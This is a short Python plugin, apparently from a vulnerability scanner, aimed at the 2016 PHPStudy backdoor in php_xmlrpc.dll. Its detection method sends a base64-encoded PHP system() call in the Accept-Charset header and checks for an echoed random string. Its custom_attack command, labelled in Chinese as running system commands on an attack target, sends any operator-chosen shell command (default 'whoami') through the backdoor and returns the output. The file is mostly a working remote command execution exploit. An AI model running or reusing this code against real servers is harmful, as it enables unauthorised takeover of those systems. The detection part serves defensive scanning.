# -*-* coding:UTF-8
import base64


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "PHPStudy后门检测",
        "description": "该软件官⽹于2016年被⾮法⼊侵，程序包⾃带PHP的php_xmlrpc.dll模块被植⼊隐藏后门，经过分析除了有反向连接⽊马之外，还可以正向执⾏任意php代码。",
    }

    def url(self) -> dict:
        random_str = self.build_random_str(12)
        r = self.request(
            method='get',
            path='./',
            headers={
                'Accept-Charset': base64.b64encode(f'system("echo {random_str}");'.encode()).decode(),
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close',
            },
            timeout=15
        )
        if r.status_code == 200 and random_str in r.text:
            return {
                "LoopholeInfo": {"app": "PHPStudy", "name": "PHPStudy后门检测"}
            }

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def custom_attack(self, url, cmd):
        r = self.request(
            method='get',
            url=url,
            headers={
                'Accept-Charset': base64.b64encode(f'system("{cmd}");'.encode()).decode(),
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close',
            },
            timeout=15
        )
        if r.status_code == 200:
            return r.text
